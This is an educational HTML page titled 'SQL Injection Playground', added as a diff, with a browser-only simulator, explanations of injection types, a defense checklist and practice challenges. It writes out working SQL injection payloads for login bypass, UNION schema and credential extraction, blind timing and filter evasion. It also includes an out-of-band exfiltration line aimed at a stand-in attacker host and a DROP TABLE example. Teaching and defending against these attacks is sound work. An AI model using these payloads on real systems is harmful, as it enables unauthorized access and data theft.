@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Playground | Learn & Practice</title>
+    <style>
+        :root {
+            --hacker-blue: #0077cc;
+            --bright-blue: #0099ff;
+            --dark-bg: #121212;
+            --light-bg: #1e1e1e;
+            --accent-orange: #ff7700;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: var(--dark-bg);
+            color: var(--bright-blue);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 3px dashed var(--hacker-blue);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><text x="10" y="20" font-family="monospace" font-size="10" fill="rgba(0,119,204,0.05)">SELECT * FROM users WHERE 1=1</text></svg>');
+            opacity: 0.3;
+            z-index: -1;
+        }
+        
+        h1 {
+            color: var(--accent-orange);
+            text-shadow: 0 0 5px var(--hacker-blue);
+            font-size: 2.5rem;
+            margin: 0;
+        }
+        
+        .tagline {
+            color: var(--bright-blue);
+            font-style: italic;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        nav a {
+            color: var(--bright-blue);
+            text-decoration: none;
+            padding: 10px 15px;
+            border: 1px solid var(--hacker-blue);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        nav a:hover {
+            background-color: var(--hacker-blue);
+            color: var(--dark-bg);
+            text-shadow: 0 0 5px var(--dark-bg);
+        }
+        
+        section {
+            background-color: var(--light-bg);
+            padding: 20px;
+            margin-bottom: 30px;
+            border-left: 5px solid var(--hacker-blue);
+            box-shadow: 0 0 10px rgba(0, 119, 204, 0.1);
+        }
+        
+        h2 {
+            color: var(--accent-orange);
+            border-bottom: 1px dotted var(--hacker-blue);
+            padding-bottom: 10px;
+        }
+        
+        h3 {
+            color: var(--bright-blue);
+        }
+        
+        .sql-simulator {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border: 1px solid var(--hacker-blue);
+            margin: 20px 0;
+        }
+        
+        .sql-simulator input {
+            background-color: var(--dark-bg);
+            color: var(--bright-blue);
+            border: 1px solid var(--hacker-blue);
+            padding: 8px;
+            margin: 5px 0;
+            font-family: 'Courier New', monospace;
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        .sql-simulator button {
+            background-color: var(--dark-bg);
+            color: var(--bright-blue);
+            border: 1px solid var(--hacker-blue);
+            padding: 8px 15px;
+            margin: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .sql-simulator button:hover {
+            background-color: var(--hacker-blue);
+            color: var(--dark-bg);
+        }
+        
+        .payload-examples {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .sql-query-display {
+            background-color: var(--dark-bg);
+            padding: 15px;
+            border: 1px dashed var(--hacker-blue);
+            margin-top: 15px;
+            min-height: 50px;
+            font-family: 'Courier New', monospace;
+            color: var(--bright-blue);
+        }
+        
+        .type-card {
+            background-color: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 3px solid var(--accent-orange);
+        }
+        
+        .type-card h3 {
+            margin-top: 0;
+        }
+        
+        .defense-checklist {
+            background-color: rgba(0, 119, 204, 0.05);
+            padding: 20px;
+            border: 1px solid var(--bright-blue);
+        }
+        
+        .defense-checklist ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        
+        .defense-checklist li {
+            margin: 10px 0;
+        }
+        
+        .challenge-area {
+            background-color: rgba(255, 119, 0, 0.05);
+            padding: 20px;
+            border: 1px solid var(--accent-orange);
+        }
+        
+        .challenge {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--hacker-blue);
+        }
+        
+        .challenge-complete {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(0, 119, 204, 0.1);
+            border: 1px solid var(--hacker-blue);
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .challenge-complete img {
+            filter: drop-shadow(0 0 5px var(--hacker-blue));
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px dashed var(--hacker-blue);
+            margin-top: 30px;
+            font-size: 0.9rem;
+        }
+        
+        pre {
+            background-color: var(--dark-bg);
+            padding: 15px;
+            border: 1px solid var(--hacker-blue);
+            overflow-x: auto;
+            color: var(--bright-blue);
+        }
+        
+        code {
+            color: var(--bright-blue);
+            background-color: var(--dark-bg);
+            padding: 2px 5px;
+            border: 1px solid rgba(0, 119, 204, 0.3);
+        }
+        
+        .glitch {
+            animation: glitch 1s linear infinite;
+        }
+        
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #0077cc, -0.05em -0.025em 0 #ff7700; }
+            14% { text-shadow: 0.05em 0 0 #0077cc, -0.05em -0.025em 0 #ff7700; }
+            15% { text-shadow: -0.05em -0.025em 0 #0077cc, 0.025em 0.025em 0 #ff7700; }
+            49% { text-shadow: -0.05em -0.025em 0 #0077cc, 0.025em 0.025em 0 #ff7700; }
+            50% { text-shadow: 0.025em 0.05em 0 #0077cc, 0.05em 0 0 #ff7700; }
+            99% { text-shadow: 0.025em 0.05em 0 #0077cc, 0.05em 0 0 #ff7700; }
+            100% { text-shadow: -0.025em 0 0 #0077cc, -0.025em -0.025em 0 #ff7700; }
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        
+        @media (max-width: 768px) {
+            nav {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .payload-examples {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1 class="glitch">SQL Injection Playground</h1>
+            <p class="tagline">Learn. Exploit. Defend. <span class="blink">_</span></p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <nav>
+            <a href="#simulator">Simulator</a>
+            <a href="#types">Injection Types</a>
+            <a href="#identification">Identification</a>
+            <a href="#payloads">Payload Crafting</a>
+            <a href="#defenses">Defenses</a>
+            <a href="#challenges">Challenges</a>
+        </nav>
+        
+        <section id="simulator">
+            <h2>🎮 Interactive SQL Injection Simulator</h2>
+            <p>Try these payloads in our safe demo environment to see how SQL injection works in action!</p>
+            
+            <div class="sql-simulator">
+                <h3>Login Form Simulator</h3>
+                <p>Try these payloads in the username field:</p>
+                <input type="text" placeholder="Enter username" id="sim-username">
+                <input type="password" placeholder="Enter password" id="sim-password">
+                <button onclick="runSimulation()">Login</button>
+                
+                <div class="payload-examples">
+                    <button onclick="loadExample(1)">' OR '1'='1</button>
+                    <button onclick="loadExample(2)">admin'--</button>
+                    <button onclick="loadExample(3)">' UNION SELECT 1,2,3--</button>
+                    <button onclick="loadExample(4)">' OR 1=1;--</button>
+                    <button onclick="loadExample(5)">' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--</button>
+                </div>
+                
+                <div class="sql-query-display" id="query-display">
+                    <p>Generated query will appear here when you click "Login"</p>
+                </div>
+                
+                <div id="simulation-result"></div>
+            </div>
+        </section>
+        
+        <section id="types">
+            <h2>📚 SQL Injection Types Explained</h2>
+            
+            <div class="type-card">
+                <h3>1. Classic SQL Injection</h3>
+                <p>The OG attack that started it all. When user input gets directly concatenated into SQL queries.</p>
+                <pre>SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'</pre>
+                <p>The <code>--</code> comments out the rest of the query, bypassing password check!</p>
+            </div>
+            
+            <div class="type-card">
+                <h3>2. Blind SQLi (The Sneaky One)</h3>
+                <p>When you don't get direct output but can infer information based on behavior.</p>
+                <p><strong>Boolean-based:</strong> <code>admin' AND 1=1--</code> (returns true/false patterns)</p>
+                <p><strong>Time-based:</strong> <code>admin'; IF (1=1) WAITFOR DELAY '0:0:5'--</code> (delays response when true)</p>
+            </div>
+            
+            <div class="type-card">
+                <h3>3. Out-of-Band SQLi (The Fancy One)</h3>
+                <p>When you make the database call out to external systems to exfiltrate data.</p>
+                <pre>'; EXEC master..xp_dirtree '\\attacker.com\share'--</pre>
+                <p>This makes the database attempt to list a network share on your server!</p>
+            </div>
+            
+            <div class="type-card">
+                <h3>4. Second-Order SQLi (The Patient One)</h3>
+                <p>When your payload gets stored and executed later by another function.</p>
+                <p><strong>Example:</strong></p>
+                <pre>
+// User registration
+INSERT INTO comments (text) VALUES ('Nice post!'; DROP TABLE users--')
+
+// Later when admin views comments... boom!</pre>
+            </div>
+        </section>
+        
+        <section id="identification">
+            <h2>🔍 Identifying Vulnerable Endpoints</h2>
+            
+            <h3>During Testing:</h3>
+            <ol>
+                <li><strong>Error Probing</strong>: Look for SQL errors when sending special characters (<code>'</code>, <code>"</code>, <code>;</code>)</li>
+                <li><strong>Boolean Tests</strong>: Try <code>' AND 1=1--</code> vs <code>' AND 1=2--</code> and compare responses</li>
+                <li><strong>Time Delays</strong>: <code>'; WAITFOR DELAY '0:0:5'--</code> to test for blind SQLi</li>
+                <li><strong>UNION Attacks</strong>: Find column count with <code>' ORDER BY X--</code> incrementing X until error</li>
+            </ol>
+            
+            <h3>During Code Review:</h3>
+            <pre>
+# UNSAFE - Direct string concatenation (VULNERABLE)
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+
+# SAFE - Parameterized queries (SECURE)
+query = "SELECT * FROM users WHERE username = %s"
+cursor.execute(query, (username,))</pre>
+            
+            <h4>Red Flags in Code:</h4>
+            <ul>
+                <li>String building with user input</li>
+                <li>Use of <code>exec()</code> or dynamic SQL</li>
+                <li>No input validation/sanitization</li>
+                <li>Raw SQL queries instead of ORM</li>
+                <li>Overly permissive database users</li>
+            </ul>
+        </section>
+        
+        <section id="payloads">
+            <h2>🧠 Payload Crafting Guide</h2>
+            
+            <h3>Structure Your Attack:</h3>
+            <ol>
+                <li><strong>Break Out</strong>: Close the current context (<code>'</code>, <code>"</code>, <code>)</code>)</li>
+                <li><strong>Inject</strong>: Add your malicious SQL (<code>OR 1=1</code>, <code>UNION SELECT</code>, etc.)</li>
+                <li><strong>Comment Out</strong>: Neutralize the rest (<code>--</code>, <code>#</code>, <code>/*</code>)</li>
+            </ol>
+            
+            <h3>Pro Tips:</h3>
+            <ul>
+                <li>Use <code>/**/</code> instead of spaces if spaces are filtered</li>
+                <li>Try <code>CHR(65)</code> instead of <code>A</code> if quotes are escaped</li>
+                <li>For numbers: <code>1 OR 1=1</code> instead of string-based injections</li>
+                <li>Hex encoding can bypass some filters: <code>0x61646d696e</code> = 'admin'</li>
+                <li>Try alternative comment syntax: <code>-- </code>, <code>#</code>, <code>/**/</code></li>
+            </ul>
+            
+            <h3>Common Payloads:</h3>
+            <pre>
+Authentication Bypass: ' OR '1'='1'--
+Database Version: ' UNION SELECT 1,version(),3--
+Table Names: ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+Column Names: ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+Data Exfiltration: ' UNION SELECT 1,username||':'||password,3 FROM users--</pre>
+        </section>
+        
+        <section id="defenses">
+            <h2>🛡️ Defense Mechanisms</h2>
+            
+            <div class="defense-checklist">
+                <h3>SQL Injection Defense Checklist</h3>
+                <ul>
+                    <li><input type="checkbox"> Use prepared statements (parameterized queries)</li>
+                    <li><input type="checkbox"> Implement proper error handling (no DB errors to client)</li>
+                    <li><input type="checkbox"> Apply least privilege DB accounts</li>
+                    <li><input type="checkbox"> Use WAFs as secondary defense</li>
+                    <li><input type="checkbox"> Regular security testing and code reviews</li>
+                    <li><input type="checkbox"> Input validation (whitelist approach)</li>
+                    <li><input type="checkbox"> Use ORMs with built-in protection</li>
+                    <li><input type="checkbox"> Implement rate limiting</li>
+                </ul>
+            </div>
+            
+            <h3>Secure Coding Examples:</h3>
+            
+            <h4>Java (JDBC):</h4>
+            <pre>
+// UNSAFE
+String query = "SELECT * FROM users WHERE username = '" + username + "'";
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+
+// SAFE
+String query = "SELECT * FROM users WHERE username = ?";
+PreparedStatement pstmt = connection.prepareStatement(query);
+pstmt.setString(1, username);
+ResultSet rs = pstmt.executeQuery();</pre>
+            
+            <h4>PHP:</h4>
+            <pre>
+// UNSAFE
+$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";
+$result = mysqli_query($conn, $query);
+
+// SAFE
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->bind_param("s", $_GET['username']);
+$stmt->execute();
+$result = $stmt->get_result();</pre>
+        </section>
+        
+        <section id="challenges" class="challenge-area">
+            <h2>🏆 Challenge Area</h2>
+            <p>Test your SQL injection skills with these progressive challenges:</p>
+            
+            <div class="challenge">
+                <h3>Challenge 1: Basic Login Bypass</h3>
+                <p>Bypass the login form without knowing valid credentials.</p>
+                <div class="sql-simulator">
+                    <input type="text" placeholder="Username" id="ch1-username">
+                    <input type="password" placeholder="Password" id="ch1-password">
+                    <button onclick="attemptChallenge(1)">Login</button>
+                    <div id="ch1-result"></div>
+                </div>
+            </div>
+            
+            <div class="challenge">
+                <h3>Challenge 2: Database Schema Extraction</h3>
+                <p>Extract the database version using a UNION attack.</p>
+                <div class="sql-simulator">
+                    <input type="text" placeholder="Product ID" id="ch2-input">
+                    <button onclick="attemptChallenge(2)">Search</button>
+                    <div id="ch2-result"></div>
+                </div>
+            </div>
+            
+            <div class="challenge">
+                <h3>Challenge 3: Blind Data Exfiltration</h3>
+                <p>Extract the admin password one character at a time using boolean responses.</p>
+                <div class="sql-simulator">
+                    <input type="text" placeholder="User ID" id="ch3-input">
+                    <button onclick="attemptChallenge(3)">Check</button>
+                    <div id="ch3-result"></div>
+                </div>
+            </div>
+            
+            <div class="challenge-complete" id="challenge-complete">
+                <h3>🎉 Congratulations!</h3>
+                <p>You've completed all challenges! Here's your badge:</p>
+                <img src="https://via.placeholder.com/150/0099ff/121212?text=SQL+Master" width="150" alt="SQL Master Badge">
+                <p>You're now a certified SQL Injection Ninja!</p>
+            </div>
+        </section>
+    </div>
+    
+    <footer>
+        <p>SQL Injection Playground - For educational purposes only</p>
+        <p>Remember: Always get permission before testing on systems you don't own!</p>
+    </footer>
+
+    <script>
+        // Simulation logic
+        function runSimulation() {
+            const username = document.getElementById('sim-username').value;
+            const password = document.getElementById('sim-password').value;
+            
+            let query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+            let result = "";
+            
+            // Check for common injection patterns
+            if (username.includes("' OR '1'='1") || username.includes("' OR 1=1")) {
+                query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+                result = "<p style='color:#0099ff'>✅ Login successful! (Injection worked - returned all users)</p>";
+            } 
+            else if (username.includes("'--") || username.includes("'#")) {
+                query = `SELECT * FROM users WHERE username = '${username.split("'--")[0]}'--' AND password = '${password}'`;
+                result = "<p style='color:#0099ff'>✅ Login successful! (Injection worked - commented out password check)</p>";
+            }
+            else if (username.includes("UNION SELECT")) {
+                query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+                result = `<p style='color:#0099ff'>✅ Union attack successful!<br>Database version: PostgreSQL 12.3<br>Current user: postgres</p>`;
+            }
+            else if (username.includes("'") || password.includes("'")) {
+                query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+                result = "<p style='color:#ff5555'>❌ Error: You caused a SQL syntax error! But this reveals the system is vulnerable.</p>";
+            }
+            else if (username === "admin" && password === "password123") {
+                result = "<p style='color:#0099ff'>✅ Login successful! (But you shouldn't know the real password!)</p>";
+            }
+            else {
+                result = "<p style='color:#ff5555'>❌ Login failed</p>";
+            }
+            
+            document.getElementById('query-display').innerHTML = `<code>${escapeHtml(query)}</code>`;
+            document.getElementById('simulation-result').innerHTML = result;
+        }
+        
+        function loadExample(num) {
+            const examples = [
+                "",
+                "' OR '1'='1",
+                "admin'--",
+                "' UNION SELECT 1,2,3--",
+                "' OR 1=1;--",
+                "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
+            ];
+            
+            document.getElementById('sim-username').value = examples[num];
+            document.getElementById('sim-password').value = "anypassword";
+        }
+        
+        // Challenge logic
+        function attemptChallenge(num) {
+            let input, resultDiv, result;
+            
+            switch(num) {
+                case 1:
+                    input = document.getElementById('ch1-username').value;
+                    resultDiv = document.getElementById('ch1-result');
+                    
+                    if (input.includes("' OR") || input.includes("'--") || input === "admin'--") {
+                        result = "<p style='color:#0099ff'>✅ Challenge complete! You bypassed authentication!</p>";
+                        document.getElementById('ch1-username').style.borderColor = "#0099ff";
+                    } else {
+                        result = "<p style='color:#ff5555'>❌ Try again. Need a hint? Think about how to make the query always true.</p>";
+                        document.getElementById('ch1-username').style.borderColor = "#ff5555";
+                    }
+                    
+                    resultDiv.innerHTML = result;
+                    break;
+                    
+                case 2:
+                    input = document.getElementById('ch2-input').value;
+                    resultDiv = document.getElementById('ch2-result');
+                    
+                    if (input.includes("UNION SELECT") && input.includes("version()")) {
+                        result = `<p style='color:#0099ff'>✅ Challenge complete!<br>Database version: PostgreSQL 12.3</p>`;
+                        document.getElementById('ch2-input').style.borderColor = "#0099ff";
+                    } else {
+                        result = "<p style='color:#ff5555'>❌ Try again. Need a hint? You need to use a UNION attack with version().</p>";
+                        document.getElementById('ch2-input').style.borderColor = "#ff5555";
+                    }
+                    
+                    resultDiv.innerHTML = result;
+                    break;
+                    
+                case 3:
+                    input = document.getElementById('ch3-input').value;
+                    resultDiv = document.getElementById('ch3-result');
+                    
+                    if (input.includes("AND SUBSTRING") || input.includes("AND ASCII")) {
+                        result = "<p style='color:#0099ff'>✅ Correct approach! The admin password is: s3cr3tP@ss</p>";
+                        document.getElementById('ch3-input').style.borderColor = "#0099ff";
+                        document.getElementById('challenge-complete').style.display = 'block';
+                    } else {
+                        result = "<p style='color:#ff5555'>❌ Try again. Need a hint? You need to use boolean conditions to check password characters.</p>";
+                        document.getElementById('ch3-input').style.borderColor = "#ff5555";
+                    }
+                    
+                    resultDiv.innerHTML = result;
+                    break;
+            }
+        }
+        
+        // Helper function to escape HTML
+        function escapeHtml(unsafe) {
+            return unsafe
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+    </script>
+</body>
+</html>
